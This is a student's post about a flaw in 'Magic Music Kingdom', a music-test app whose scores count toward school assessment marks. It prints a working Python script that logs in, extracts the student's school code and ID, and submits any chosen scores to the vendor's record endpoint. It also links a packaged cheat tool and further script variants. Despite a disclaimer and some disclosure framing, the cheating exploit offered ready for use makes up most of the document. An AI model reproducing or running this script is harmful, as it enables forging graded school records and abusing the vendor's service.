> [!CAUTION]
> If anyone uses the following script to engage in activities that will break the school regulations or laws in your jurisdiction, Lee Perseus Robin will not pay any responsibility for the respective activities.

> [!NOTE]
> This article discusses a recent event; please view it with caution.

Since the email vulnerability, Lee Perseus Robin (2G - 16) has found yet again a Vulnerability that could be taken advantage of. 
This time around, it is about the Magic Music Kingdom, used by the Music Department for giving tests on instruments and also counting as SBA marks.

## What is "Magic Music Kingdom"?
> From [Hong Kong Music Publisher](https://www.hkmusic.com.hk/web/apps.asp?lang=en)

Magic Music Kingdom has a series of interactive games with different levels to accommodate your music lessons. 
The games include recognizing notes and rhythm, knowledge about composers and their works, etc. 
All records can be saved for teachers or students to keep track of the learning progress.

## What does the "cheating script" do?
Basically:
1. It pretends to be the user by getting their credentials and retrieving the school code and school ID from the hkmusic.com.hk login page (NEW: Magic Music Kingdom API for the PoC Python Script).
2. It continues to use the same logic that the normal app has and sends a POST request with the information given.
3. Then, the user's record will update to what the user has ordered, hence enabling cheating.

## How to run the cheating script?
- **Windows Version - Based on Python with Tkinter**: [magic-music-kingdom-cheat-ui.zip](https://github.com/user-attachments/files/18041408/magic-music-kingdom-cheat-ui.zip)
- **Google Form Version (Proof of Concept)**: [Google Form](https://forms.gle/etBbtW6QSHtjhE8z9)
- **Source Code for the Google Form (Google Apps Script)**: [Pastebin](https://pastebin.com/raw/pEEfMTST)
- **List of Game ID and Games**: [Imgur Album](https://imgur.com/a/8fGM1Hp)

### Python Version (for demonstration purposes only, PoC):
1. Requirments: (pip install) requests
```python
import requests
import re
import math

# Input variables from the user
name_login = input("Enter your login name: ")
password = input("Enter your password: ")
gameID = input("Enter game ID: ")
total_correct = input("Enter total correct answers: ")
total_wrong = input("Enter total wrong answers: ")
highestMaxCombo = input("Enter highest max combo: ")
totalScore = input("Enter total score: ")

# Calculate correct percentage
correct_percent = math.ceil((int(total_correct) * 100) / (int(total_correct) + int(total_wrong))) if (int(total_correct) + int(total_wrong)) > 0 else 0

# Perform login
response_text = requests.get(f"https://www.hkmusic.com.hk/web/student_pages/login/appLoginRegistered.asp?name_login={name_login}&pw={password}").text

# Extract school code and student ID using regex (Student Form Number is optional, doesn't matter)
school_code_match = re.search(r'studentSchoolCode=([^&]*)', response_text)
student_id_match = re.search(r'studentIDcode=([^&]*)', response_text)
student_form_num_match = re.search(r'studentFormNum=([^&]*)', response_text)

school_code = school_code_match.group(1) if school_code_match else None
student_id = student_id_match.group(1) if student_id_match else None
student_form_num = student_form_num_match.group(1) if student_form_num_match else None

print("School code:", school_code, "\nStudent ID:", student_id)

if school_code and student_id:
    # Record URL and parameters
    record_url = "https://www.hkmusic.com.hk/web/shareResources/MusicMagicKingdom_beta2/appMMKaddRecord.asp"
    params = {
        'student_id': student_id,
        'school_code': school_code,
        'gameID': gameID,
        'studentFormNumCurrent': student_form_num,
        'totalCorrect': total_correct,
        'totalWrong': total_wrong,
        'correctPercent': correct_percent,
        'highestMaxCombo': highestMaxCombo,
        'totalScore': totalScore
    }

    # Submit the record
    record_response = requests.session().get(record_url, params=params)
    print("Response Status Code:", record_response.status_code)
    print("Response Content:", record_response.text)
else:
    print("Login failed or could not retrieve student info.")
```
## How to fix the Vulnerability?
The only people who can fix this is the employees in "Hong Kong Music Publisher", which we have a very slim chance of getting their attention. 
Therefore, I propose that we just get rid of Music Magic Kingdom altogether, it ain't that fun, eh?
## How to contact us to get more information about the Vulnerability?
For further inquiries or additional information regarding this vulnerability, please feel free to reach out to me at [perseus@lscstudy.us.kg](mailto:perseus@lscstudy.us.kg), [s23218@lsc.hk](mailto:s23218@lsc.hk) or [perseusrobin@gmail.com](mailto:perseusrobin@gmail.com).
## Additional information
Checking if the person has gotten 10 marks: https://pastebin.com/nDF8zawt
The PoC Python script but using arguements: https://pastebin.com/DHMn6c2u
## Special thanks
The discoverer of the Vulnerability would like to thank the Developers at FFDec and 7-zip, their software has been a massive help for dicovering this.

![image](https://github.com/user-attachments/assets/e016973b-2da3-4b64-82b5-10a30ebad707)